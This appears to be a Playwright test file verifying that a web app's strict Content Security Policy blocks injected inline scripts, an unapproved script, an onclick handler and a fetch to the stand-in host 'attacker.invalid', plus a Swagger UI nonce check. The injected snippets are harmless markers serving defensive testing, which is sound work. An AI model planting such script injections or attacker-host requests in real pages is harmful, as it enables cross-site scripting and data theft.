import { test, expect } from '@playwright/test';

test('strict CSP blocks injected scripts, event handlers and an external exfiltration request', async ({
  page
}) => {
  let unauthorizedRequests = 0;
  await page.route('**/unapproved.js', (route) => {
    unauthorizedRequests++;
    return route.fulfill({ contentType: 'text/javascript', body: 'globalThis.compromised = true;' });
  });
  await page.route('https://attacker.invalid/**', (route) => {
    unauthorizedRequests++;
    return route.fulfill({ body: 'unexpected' });
  });
  await page.route('http://127.0.0.1:4217/', async (route) => {
    const response = await route.fetch();
    const html = await response.text();
    // noinspection HtmlUnknownTarget
    await route.fulfill({
      response,
      body: html.replace(
        '</body>',
        '<script>globalThis.compromised=true</script><script src="/unapproved.js"></script><button id="xss" onclick="globalThis.compromised=true">Injected</button></body>'
      )
    });
  });
  const response = await page.goto('/');
  const policy = response!.headers()['content-security-policy'];
  expect(policy).toContain("'strict-dynamic'");
  expect(policy).toMatch(/script-src 'sha256-/);
  expect(policy).not.toContain("script-src 'self'");
  expect(policy).not.toContain("'unsafe-eval'");
  await expect(page.getByRole('button', { name: 'Anmelden', exact: true })).toBeVisible();
  await page.locator('#xss').click();
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://attacker.invalid/test', { mode: 'no-cors' });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
  expect(
    await page.evaluate(() => (globalThis as typeof globalThis & { compromised?: boolean }).compromised)
  ).toBeUndefined();
  expect(unauthorizedRequests).toBe(0);
});

test('Swagger UI runs with fresh nonces and without external script permissions', async ({ page }) => {
  await page.addInitScript(() => {
    (window as Window & { policyViolations?: string[] }).policyViolations = [];
    document.addEventListener('securitypolicyviolation', (event) =>
      (window as Window & { policyViolations?: string[] }).policyViolations!.push(event.effectiveDirective)
    );
  });
  const response = await page.goto('/docs/');
  const policy = response!.headers()['content-security-policy'];
  expect(policy).toMatch(/script-src 'nonce-/);
  expect(policy).toContain("'strict-dynamic'");
  expect(policy).not.toContain("script-src 'self'");
  await expect(page.locator('.swagger-ui .info .title')).toBeVisible();
  expect(
    await page.evaluate(() => (window as Window & { policyViolations?: string[] }).policyViolations)
  ).toEqual([]);
});
